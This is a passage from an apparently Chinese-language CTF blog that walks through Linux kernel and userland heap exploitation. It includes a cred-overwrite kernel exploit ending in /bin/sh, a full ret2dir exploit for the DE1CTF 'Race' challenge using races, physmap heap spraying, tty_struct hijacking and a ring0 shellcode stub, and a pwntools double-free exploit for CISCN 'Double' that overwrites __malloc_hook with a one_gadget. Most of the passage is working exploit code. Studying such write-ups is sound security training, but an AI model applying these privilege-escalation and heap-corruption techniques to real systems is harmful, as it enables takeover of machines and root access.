= module_base + <span class="number">0x1fe</span> + page_offset_base_off;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]leak page_base_offset:%lx\n"</span>,page_offset_base);</span><br><span class="line">    <span class="comment">//4.now we leak rael page off base</span></span><br><span class="line">    fake_note[<span class="number">0</span>] = <span class="number">0</span> ^ key;</span><br><span class="line">    fake_note[<span class="number">1</span>] = <span class="number">8</span> ^ key;</span><br><span class="line">    fake_note[<span class="number">2</span>] = page_offset_base ^ key; </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> base_addr;</span><br><span class="line">    Edit(<span class="number">1</span>,<span class="number">0x18</span>,buf);</span><br><span class="line">    Show(<span class="number">2</span>,(<span class="keyword">char</span>*)&amp;base_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]leak real page base offset:%llx\n"</span>,base_addr);</span><br><span class="line">    <span class="comment">//search cred using task_struct</span></span><br><span class="line">    prctl(PR_SET_NAME,<span class="string">"[*]WuHanJiaYou!"</span>);<span class="comment">//</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>* task;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i; ;i += <span class="number">0xf0</span>)&#123;</span><br><span class="line">        fake_note[<span class="number">0</span>] = <span class="number">0</span> ^ key;</span><br><span class="line">        fake_note[<span class="number">1</span>] = <span class="number">0xf0</span> ^ key;</span><br><span class="line">        fake_note[<span class="number">2</span>] = i ^ key;</span><br><span class="line">        Edit(<span class="number">1</span>,<span class="number">0x18</span>,buf);</span><br><span class="line">        Show(<span class="number">2</span>,buf);</span><br><span class="line">        task = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)memmem(buf,<span class="number">0xf0</span>,<span class="string">"[*]WuHanJiaYou!"</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">if</span>(task != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[+]found success,task:%p,cred:0x%lx,real_cred:0x%lx\n"</span>,task,task[<span class="number">-1</span>],task[<span class="number">-2</span>]);</span><br><span class="line">            <span class="keyword">if</span>(task[<span class="number">-1</span>]&gt;<span class="number">0xffff000000000000</span> &amp;&amp; task[<span class="number">-2</span>]&gt;<span class="number">0xffff000000000000</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//ovwrite cred</span></span><br><span class="line">    fake_note[<span class="number">0</span>] = <span class="number">0</span> ^ key;</span><br><span class="line">    fake_note[<span class="number">1</span>] = <span class="number">0x28</span> ^ key;</span><br><span class="line">    fake_note[<span class="number">2</span>] = (task[<span class="number">-2</span>]+<span class="number">4</span>-base_addr) ^ key;</span><br><span class="line">    Edit(<span class="number">1</span>,<span class="number">0x18</span>,buf);</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'\x00'</span>,<span class="number">0x30</span>);</span><br><span class="line">    Edit(<span class="number">2</span>,<span class="number">0x28</span>,buf);</span><br><span class="line">    <span class="keyword">char</span>* args[<span class="number">2</span>] = &#123;<span class="string">"/bin/sh"</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line">    execv(<span class="string">"/bin/sh"</span>,args);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ret2dir"><a href="#ret2dir" class="headerlink" title="ret2dir"></a>ret2dir</h3><h3 id="简介-5"><a href="#简介-5" class="headerlink" title="简介"></a>简介</h3><p>这种攻击最早是在<code>DE1CTF</code>见到的，当时<code>ycx</code>学长的博客有相关实践，当时对于内核完全摸不着头脑，现在大概懂了一些基本trick，翻一下<code>de1ta</code>在先知给的<a href="https://xz.aliyun.com/t/5944#toc-9" target="_blank" rel="noopener">writeup</a>，尝试学习一波。</p>
<h3 id="DE1CTF-Race"><a href="#DE1CTF-Race" class="headerlink" title="DE1CTF Race"></a>DE1CTF Race</h3><h4 id="程序分析-amp-amp-漏洞利用"><a href="#程序分析-amp-amp-漏洞利用" class="headerlink" title="程序分析 &amp;&amp; 漏洞利用"></a>程序分析 &amp;&amp; 漏洞利用</h4><p>跟之前那道题差不多，先看下自己实现的fops，发现全是空，ioctl是没有上锁的，<code>copy_from_user</code>和<code>copy_to_user</code>都是非原子操作。实现了<code>New</code>、<code>Edit</code>、<code>Show</code>和<code>Delete</code>功能。之前那道题目提到了别名页，实际上就是这里的<code>physmap</code>。</p>
<p>开始我自己想用的是之前提到的userfaultfd来保证竞争的结果可控，后来发现这个API好像用不了，只能利用mmap缺页造成的短暂中断间隙进行竞争删除。</p>
<p>官方的给的思路前面是用到了<code>physmap</code>的特性，就是这个地址的基址实际上是物理地址<code>physical_addr+offset</code>，可以绕过地址随机化。我们在<code>Show</code>的时候竞争删除，从而泄露出<code>slab</code>地址，根据官方的解释<code>physmap</code>的地址应该在<code>slab</code>前面，且包含<code>slab</code>，这个个人感觉是有依据的，之前在做xman那道题的时候看p4nda师傅博客给的爆破地址的起始地址就是没有开地址随机化的<code>physmap</code>位置。</p>
<p>猜测了<code>physmap</code>地址(不一定是起始地址，但是是在这个区域中的一个地址)，我们先用堆喷占位<code>physmap</code>区域，为了提高命中率我们分配的内存大小为<code>64M</code>，是整个进程的一半。在<code>Edit</code>的时候竞争删除，从而可以往<code>slab</code>的<code>fd</code>竞争写入刚才猜的地址。</p>
<p>后面官方的做法是分配<code>tty_struct</code>结构体，因为我们现在<code>slab</code>从<code>physmap</code>开始分配，<code>tty_struct</code>会分配到这块区域，之后我们<code>check</code>堆喷到的内存查看有无非零区域(<code>tty_struct</code>结构体里有一堆函数指针)，遇到非零值就说明找到了<code>slab_addr</code>并可以通过函数指针及偏移找到<code>vmlinux_base</code>，再往后官方是从<code>tty_struct</code>下手，我觉得既然有竞争的<code>UAF</code>可以改<code>modprobe_path</code>，应该更简单一点。</p>
<h4 id="exp-c-6"><a href="#exp-c-6" class="headerlink" title="exp.c"></a>exp.c</h4><p>自己实在是懒得写(或抄)exp，作为kernel入门篇的最后一篇文章也还是以官方的writeup收尾。注意这个exp后面有一个自己写内核shellcode的部分需要自己补充(这就是为什么我说不如改<code>modprobe_path</code>方便的原因)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pty.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> test_ioctl_read		0x23333</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> test_ioctl_write	0x23334</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> test_ioctl_del		0x23335</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> thread_num		10	<span class="comment">//local 0x10; server 10</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mp_size			1024*64 <span class="comment">//64K</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> spray_times		32*32	<span class="comment">// heap spray size : 64K*16*32 = 32M</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> kernel_offset		0x106b4e0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_memory_x		0x55580</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *spray[spray_times];</span><br><span class="line"><span class="keyword">int</span> fd = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> ptmx;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> size;</span><br><span class="line">	<span class="keyword">char</span> *buf;</span><br><span class="line">&#125;data;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">error_quit</span><span class="params">(<span class="keyword">char</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	perror(arg);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ex</span><span class="params">(<span class="keyword">char</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"%s\n"</span>,arg);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">race_kill</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ioctl(fd,test_ioctl_del, &amp;data);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">race_read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">void</span> *mp;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">data_struct</span> <span class="title">data</span>;</span></span><br><span class="line">	<span class="keyword">pthread_t</span> tid[thread_num];</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">0x2c0</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(buf, <span class="string">'a'</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="keyword">if</span> ((mp = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span> )) == MAP_FAILED)</span><br><span class="line">                error_quit(<span class="string">"mmap error"</span>);</span><br><span class="line">	data.size = <span class="number">0x2c0</span>;</span><br><span class="line">	data.buf = (<span class="keyword">void</span> *)buf;</span><br><span class="line">	ioctl(fd, test_ioctl_read, &amp;data);</span><br><span class="line">	data.size = <span class="number">7</span>;</span><br><span class="line">	data.buf = mp;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; thread_num; i++)</span><br><span class="line">		<span class="keyword">if</span> (pthread_create(&amp;tid[i], <span class="literal">NULL</span>, race_kill, <span class="literal">NULL</span>) != <span class="number">0</span>)</span><br><span class="line">			error_quit(<span class="string">"pthread_create error"</span>);</span><br><span class="line">	ioctl(fd, test_ioctl_write, &amp;data);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; thread_num; i++)</span><br><span class="line">		pthread_join(tid[i],<span class="literal">NULL</span>);</span><br><span class="line">	data.size = <span class="number">0x2c0</span>;</span><br><span class="line">	ioctl(fd, test_ioctl_read, &amp;data);</span><br><span class="line">        <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)mp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_through</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> write_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> wfd;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *buf;</span><br><span class="line">	ret = posix_memalign((<span class="keyword">void</span> **)&amp;buf, <span class="number">512</span>, <span class="number">1024</span>);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		error_quit(<span class="string">"posix_memalign failed"</span>);</span><br><span class="line">	*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)buf = write_addr;</span><br><span class="line">	wfd = open(<span class="string">"./data"</span>, O_WRONLY | O_DIRECT | O_CREAT, <span class="number">0755</span>);</span><br><span class="line">	<span class="keyword">if</span> (wfd == <span class="number">-1</span>)</span><br><span class="line">		error_quit(<span class="string">"open data failed"</span>);</span><br><span class="line">	<span class="keyword">if</span> (write(wfd, buf, <span class="number">1024</span>) &lt; <span class="number">0</span>)</span><br><span class="line">		error_quit(<span class="string">"write data failed"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(buf);</span><br><span class="line">	close(wfd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">race_write</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">pthread_t</span> tid[thread_num];</span><br><span class="line">	<span class="keyword">int</span> wfd = open(<span class="string">"./data"</span>,O_RDWR);</span><br><span class="line">	<span class="keyword">if</span> (wfd == <span class="number">-1</span>)</span><br><span class="line">		error_quit(<span class="string">"open data failed"</span>);</span><br><span class="line">	<span class="keyword">char</span> *p = mmap(<span class="literal">NULL</span>,<span class="number">4096</span>,PROT_READ,MAP_PRIVATE,wfd,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (p == MAP_FAILED)</span><br><span class="line">		error_quit(<span class="string">"data mmap failed"</span>);</span><br><span class="line">	data.buf = (<span class="keyword">void</span> *)p;</span><br><span class="line">	data.size = <span class="number">0x2c0</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; thread_num; i++)</span><br><span class="line">		<span class="keyword">if</span> (pthread_create(&amp;tid[i], <span class="literal">NULL</span>, race_kill, <span class="literal">NULL</span>) != <span class="number">0</span>)</span><br><span class="line">			error_quit(<span class="string">"pthread_create error"</span>);	</span><br><span class="line">	ioctl(fd, test_ioctl_read, &amp;data);	</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; thread_num; i++)</span><br><span class="line">		pthread_join(tid[i],<span class="literal">NULL</span>);</span><br><span class="line">	ptmx = open(<span class="string">"/dev/ptmx"</span>,O_RDWR);</span><br><span class="line">	close(wfd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">heap_spray</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">void</span> *mp;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; spray_times; i++)</span><br><span class="line">	&#123;</span><br><span class="line">        	<span class="keyword">if</span> ((mp = mmap(<span class="literal">NULL</span>, mp_size, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span> )) == MAP_FAILED)</span><br><span class="line">                	error_quit(<span class="string">"mmap error"</span>);</span><br><span class="line">		<span class="built_in">memset</span>(mp, <span class="number">0</span>, mp_size);</span><br><span class="line">		spray[i] = mp;</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> *<span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; spray_times; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> *p = spray[i];</span><br><span class="line">		<span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (j &lt; mp_size/<span class="number">8</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (p[j] != <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">return</span> &amp;p[j];</span><br><span class="line">			j += <span class="number">512</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_ptmx_slave</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *pts_name;</span><br><span class="line">	<span class="keyword">if</span> (grantpt(ptmx) &lt; <span class="number">0</span> || unlockpt(ptmx) &lt; <span class="number">0</span>) </span><br><span class="line">		error_quit(<span class="string">"grantpt and unlockpt fail\n"</span>);</span><br><span class="line"></span><br><span class="line">	pts_name = (<span class="keyword">const</span> <span class="keyword">char</span> *)ptsname(ptmx);</span><br><span class="line">	<span class="keyword">int</span> fds = open(pts_name, O_RDONLY | O_NOCTTY);</span><br><span class="line">	<span class="keyword">if</span> (fds &lt; <span class="number">0</span>) </span><br><span class="line">		error_quit(<span class="string">"open /dev/ptmx fail\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> fds;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// int t[0x100];</span></span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">/* for (i = 0; i &lt; 0x100; i++)</span></span><br><span class="line"><span class="comment">	&#123;</span></span><br><span class="line"><span class="comment">		t[i] = open("/dev/ptmx",O_RDWR);</span></span><br><span class="line"><span class="comment">		if (t[i] == -1)</span></span><br><span class="line"><span class="comment">			error_quit("open ptmx error");</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">	for (i = 0; i &lt; 0x100; i++)</span></span><br><span class="line"><span class="comment">		close(t[i]);</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> slab_addr;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line">	<span class="keyword">int</span> pts;</span><br><span class="line">        <span class="keyword">if</span> ((fd = open(<span class="string">"/dev/test"</span>,O_RDWR)) == <span class="number">-1</span>)</span><br><span class="line">		error_quit(<span class="string">"open test.ko error"</span>);</span><br><span class="line">	slab_addr = race_read();</span><br><span class="line">	<span class="keyword">if</span> (slab_addr &lt; <span class="number">0xff000000000000</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">		<span class="built_in">sprintf</span>(buf, <span class="string">"%s:0x%lx"</span>,<span class="string">"slab addr failed"</span>,slab_addr);</span><br><span class="line">		ex(buf);</span><br><span class="line">	&#125;</span><br><span class="line">	slab_addr = slab_addr | <span class="number">0xff00000000000000</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"slab_addr:0x%lx\n"</span>,slab_addr);</span><br><span class="line">	slab_addr = slab_addr &amp; <span class="number">0xffffffffff000000</span>;</span><br><span class="line">	heap_spray();</span><br><span class="line">	write_through(slab_addr);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> *p = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">while</span> (i++ &lt; <span class="number">0x1000</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		race_write();</span><br><span class="line">		p = check();</span><br><span class="line">		<span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">goto</span> get_root;</span><br><span class="line">		close(ptmx);</span><br><span class="line">	&#125;</span><br><span class="line">	ex(<span class="string">"physmap_addr not found"</span>);</span><br><span class="line">get_root:</span><br><span class="line">	kernel_base = p[<span class="number">3</span>] - kernel_offset;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"physmap_addr:%p = 0x%lx\n"</span>, p, slab_addr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"kernel base:0x%lx\n"</span>, kernel_base);</span><br><span class="line">	pts = get_ptmx_slave();</span><br><span class="line">	p[<span class="number">3</span>] = slab_addr + <span class="number">0x300</span>;</span><br><span class="line">	p[<span class="number">0x300</span>/<span class="number">8</span>+<span class="number">12</span>] = kernel_base + set_memory_x;	<span class="comment">// tty-&gt;ops-&gt;ioctl = set_memory_x</span></span><br><span class="line">	ioctl(pts,<span class="number">0x2333</span>,<span class="number">1</span>);</span><br><span class="line">	p[<span class="number">0x300</span>/<span class="number">8</span>+<span class="number">12</span>] = slab_addr + <span class="number">0x400</span>;		<span class="comment">// tty-&gt;ops-&gt;ioctl = shellcode</span></span><br><span class="line">	<span class="built_in">memset</span>((<span class="keyword">char</span> *)p+<span class="number">0x400</span>, <span class="number">0x90</span>, <span class="number">0x100</span>);		<span class="comment">// place your shellcode here, it will run in ring0. gl hf.</span></span><br><span class="line">	getchar();</span><br><span class="line">	ioctl(pts,<span class="number">0x2333</span>,<span class="number">1</span>);	</span><br><span class="line">	close(fd);</span><br><span class="line">	close(pts);</span><br><span class="line">	close(ptmx);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>这种攻击非常非常类似于去年TSCTF鸡哥出的题，同样都是堆喷，同样都是改一个值之后爆破打印确定其位置，再次膜<code>w1tcher</code>和<code>p4nda</code>师傅。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这篇文章断断续续写了两个月大概，写kernel的exp太累，尤其是多线程/进程不好调试的题目，收获到了很多东西，todolist本来还有n1ctf的一道题，但是看了题解觉得自己的功力还不够，下一步的目标是复现两个想了很久的内核CVE。不知不觉已经正月十五了，寒假又废了，希望这俩CVE对我好一点qwq。</p>
]]></content>
      <tags>
        <tag>kernel pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Double</title>
    <url>/2020/09/03/2019CISCN/Double/</url>
    <content><![CDATA[<h1 id="Double"><a href="#Double" class="headerlink" title="Double"></a>Double</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>周末再刷一下前几天没做完的信安竞赛题，题目利用比较简单，但是程序代码写的有点复杂，自己读代码的能力太差，这里还是总结一下。</p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>程序共有四个功能，New、Show、Edit和Delete</p>
<p><img src="/2020/09/03/2019CISCN/Double/1.jpg" alt="main"></p>
<p>NewInfo里先malloc了一个chunk做node，观察之后，可以新建一个结构体来帮助理解代码。一个node大小为0x18，前4字节是chunk在链表中的index，第二个4字节表示chunk的内容的size，下面8字节存chunk_addr，最后8字节存储next_node指针，最后一个Node这个成员为0。<br>每次New的时候都会先新建一个node，通过s2输入至多0x100长的数据。0x4040d0处存放链表头指针，0x4040d8处存放链表尾指针，每次先判断尾指针是否有值且上一个chunk的内容是否和这次输入的数据相等，如果一样，直接把上一个node复制一遍，加入到链表尾部。</p>
<p><img src="/2020/09/03/2019CISCN/Double/2.jpg" alt="node"></p>
<p>这里malloc5个内容不同的chunk观察一下帮助理解。</p>
<p><img src="/2020/09/03/2019CISCN/Double/3.jpg" alt="node2"></p>
<p>如果不满足上述条件，则重新malloc一个chunk加入到链表尾部。</p>
<p><img src="/2020/09/03/2019CISCN/Double/4.jpg" alt="new1"><br><img src="/2020/09/03/2019CISCN/Double/5.jpg" alt="new2"></p>
<p>Show函数挨个遍历node，根据Node-&gt;index寻找目标index，找到就用puts输出其内容。</p>
<p><img src="/2020/09/03/2019CISCN/Double/6.jpg" alt="show"></p>
<p>Edit函数通过Buf获取输入，根据输入长度判断，如果小于等于原来chunk的size就直接strcpy过去，否则重新malloc，并修改node的相应字段。</p>
<p><img src="/2020/09/03/2019CISCN/Double/7.jpg" alt="edit"></p>
<p>Delete函数依次释放chunk_addr和node，并将node从链表中摘除。注意删除的时候并没有修改链表的index，如果不是删除最后一个chunk，New的时候也是从最后一个index开始，index不会存在free之后在malloc即可复用，而是不断递增。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v3-&gt;next_node = ptr-&gt;next_node;<span class="comment">//v3为目标node的前一个Node</span></span><br></pre></td></tr></table></figure>
<p><img src="/2020/09/03/2019CISCN/Double/8.jpg" alt="delete"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>利用New相同的内容即可获得两个同样的node，可以double free。先malloc两个samll bin，删除第一个，show第二个chunk即可泄露Libc。在gdb寻找malloc_hook周围fake_chunk，double free之后malloc到这个chunk，修改__malloc_hook为one_gadget_addr，再Malloc一个chunk即可get shell。</p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span><span class="params">(data)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Your data:\n'</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Info index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(index,data)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Info index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Info index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    New(<span class="string">'a'</span>*<span class="number">0xf0</span>)<span class="comment">#0</span></span><br><span class="line">    New(<span class="string">'a'</span>*<span class="number">0xf0</span>)<span class="comment">#1</span></span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Show(<span class="number">1</span>)</span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">88</span> - <span class="number">0x3c4b20</span></span><br><span class="line">    log.success(<span class="string">'libc base =&gt;'</span> + hex(libc_base))</span><br><span class="line">    malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    fake_chunk = malloc_hook - <span class="number">0x23</span></span><br><span class="line">    gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">    shell_addr = libc_base + gadgets[<span class="number">1</span>]</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    New(<span 